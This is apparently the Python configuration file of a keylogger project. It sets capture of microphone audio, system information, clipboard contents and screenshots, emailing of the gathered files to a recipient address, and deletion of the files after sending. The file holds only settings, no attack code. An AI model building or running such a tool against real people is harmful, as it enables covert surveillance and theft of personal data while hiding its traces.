
###############################################################
################## MICROPHONE CONFIGURATION ###################
###############################################################

CHANNELS = 2
DTYPE = 'float64'
DURATION = 5 # Default duration of the recording in seconds.
FREQUENCY = 44100
MICROPHONE_FILE_NAME = 'microphone_record.wav' # Output file name. Must end with a correct audio format.


###############################################################
############# COMPUTER INFORMATION CONFIGURATION ##############
###############################################################

COMPUTER_INFO_FILE_NAME = 'computer_info.txt' # Output file name.


###############################################################
################### CLIPBOARD CONFIGURATION ###################
###############################################################

CLIPBOARD_FILE_NAME = 'clipboard_info.txt' # Output file name.


###############################################################
################## SCREENSHOT CONFIGURATION ###################
###############################################################

SCREENSHOT_FILE_NAME = 'screenshot_info.png' # Output file name.


###############################################################
################# ENCRYPTATION CONFIGURATION ##################
###############################################################

ENC_PASS_FILENAME = 'pass.enc' # File name for the generated file with the encrypted pass.
KEY_FILENAME = 'pass.key' # File name for the generated file with the key.


###############################################################
#################### EMAIL CONFIGURATION ######################
###############################################################

FROM_EMAIL_ADDRESS = 'yourmail@gmail.com' # Email address used to send the gathered information.
EMAIL_PASSWORD = b'yourpassword' # Email password for the email address used to send the gathered information.
EMAIL_SUBJECT = 'Keylogger test' # Email subject used for the generated emails.
EMAIL_TEXT = 'Testing keylogger, see file attached.' # Content of the email generated to send the gathered information.
TO_EMAIL_ADDRESS = 'anothermail@gmail.com' # Email recipient. 


###############################################################
################## KEYLOGGER CONFIGURATION ####################
###############################################################

CLEAN_UP = True # Remove any generated file by this script after the information have been sent.
TIME = 10 # Time between records in seconds.
